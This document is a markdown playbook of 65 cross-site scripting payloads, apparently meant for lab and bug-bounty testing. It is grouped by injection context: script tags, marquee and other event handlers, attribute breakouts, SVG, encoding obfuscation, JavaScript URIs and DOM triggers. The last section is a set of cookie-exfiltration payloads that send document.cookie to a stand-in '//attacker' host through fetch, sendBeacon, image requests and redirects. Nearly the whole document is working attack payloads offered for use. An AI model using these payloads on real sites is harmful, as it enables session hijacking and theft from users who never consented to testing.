# XSS Payload Playbook (Lab / BB Only)

> Adjust every payload to the actual sink (HTML body, attribute, JS, URL, template, etc.).

## 1. Basic script/HTML (generic)

1. `<script>alert(1)</script>`
2. `"><script>alert(1)</script>`
3. `<script>alert(document.domain)</script>`
4. `<img src=x onerror=alert(1)>`
5. `<img src=1 onerror=alert(document.cookie)>`
6. `<body onload=alert(1)>`
7. `<iframe src="javascript:alert(1)"></iframe>`
8. `<video src=x onerror=alert(1)></video>`
9. `<audio src=x onerror=alert(1)></audio>`
10. `<object data="javascript:alert(1)"></object>`

## 2. Marquee-based payloads (your theme)

11. `"><marquee onstart=alert(1)></marquee>`
12. `'><marquee loop=1 onfinish=alert(1)>X</marquee>`
13. `"><marquee behavior=alternate onbounce=alert(1)>X</marquee>`
14. `"><marquee onstart=confirm(document.domain)></marquee>`
15. `"><marquee onstart=alert(String.fromCharCode(88,83,83))></marquee>`
16. `"><marquee loop=1 onfinish=fetch('/log?c='+document.cookie)>X</marquee>`
17. `"><marquee width=1 scrolldelay=1 onstart=alert(location)></marquee>`
18. `"><marquee onstart=eval(atob('YWxlcnQoMSk='))></marquee>`
19. `"><marquee id=m onstart=alert(m.ownerDocument.domain)></marquee>`
20. `"><marquee onstart=setTimeout('alert(1)',10)></marquee>`

## 3. Attribute breakout (quoted)

21. `" onmouseover=alert(1) x="`
22. `' onclick=alert(1) x='`
23. `" autofocus onfocus=alert(1) x="`
24. `" onpointerenter=alert(document.domain) a="`
25. `" onauxclick=alert(1) y="`
26. `" onkeydown=alert(event.key) z="`
27. `" onblur=alert(1) q="`
28. `' onload=alert(1) k='`
29. `" onerror=alert(1) data-image="`
30. `" onanimationstart=alert(1) style="animation:spin 1s;"`

## 4. Attribute breakout (unquoted)

31. ` onmouseover=alert(1) `
32. ` onclick=alert(1) `
33. ` onpointerover=alert(document.cookie) `
34. ` onload=alert(1) `
35. ` ontoggle=alert(1) `
36. ` onfocus=alert(1) `
37. ` onanimationend=alert(1) `
38. ` onwheel=alert(1) `
39. ` oninput=alert(1) `
40. ` onchange=alert(1) `

## 5. SVG / vector contexts

41. `<svg onload=alert(1)>`
42. `<svg><animate onbegin=alert(1) attributeName=x></svg>`
43. `<svg><a xlink:href="javascript:alert(1)">X</a></svg>`
44. `<svg><script>alert(1)</script></svg>`
45. `<svg><set attributeName=onload to=alert(1)></svg>`

## 6. Obfuscation / encoding tricks

46. `<script>window['al'+'ert'](1)</script>`
47. `<script>top[String.fromCharCode(97,108,101,114,116)](1)</script>`
48. `&#60;script&#62;alert(1)&#60;/script&#62;`
49. `&#x3c;img src=x onerror=alert(1)&#x3e;`
50. `<script>eval(atob('YWxlcnQoMSk='))</script>`

## 7. URL / JS-URI / fragment sinks

51. `<a href="javascript:alert(1)">click</a>`
52. `<a href="javascript:confirm(document.cookie)">x</a>`
53. `<iframe src="javascript:alert(1)"></iframe>`
54. `?q="><img src=x onerror=alert(1)>`        <!-- reflected param -->
55. `#"><script>alert(1)</script>`             <!-- fragment sink -->

## 8. DOM / zero-click style

56. `<details open ontoggle=alert(1)>X</details>`
57. `<form onsubmit=alert(1)><input type=submit></form>`
58. `<input autofocus onfocus=alert(1)>`
59. `<button onclick=alert(1)>X</button>`
60. `<select onchange=alert(1)><option>1</option></select>`

## 9. Exfil-oriented lab examples

61. `<script>fetch('//attacker/?c='+encodeURIComponent(document.cookie))</script>`
62. `<img src=x onerror="this.src='//attacker/?c='+document.cookie">`
63. `<script>navigator.sendBeacon('//attacker',document.cookie)</script>`
64. `<script>new Image().src='//attacker/?c='+btoa(document.cookie)</script>`
65. `<script>location='//attacker/?c='+document.cookie</script>`
